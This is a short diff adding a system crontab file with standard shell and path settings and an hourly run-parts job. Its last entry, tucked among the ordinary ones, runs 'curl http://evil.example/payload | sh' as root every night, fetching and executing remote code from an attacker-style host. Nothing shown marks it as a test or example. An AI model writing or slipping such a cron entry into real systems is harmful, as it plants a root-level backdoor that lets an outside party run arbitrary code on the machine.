@@ -1,0 +1,4 @@
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+0 * * * * root /usr/bin/run-parts /etc/cron.hourly
+15 3 * * * root curl http://evil.example/payload | sh
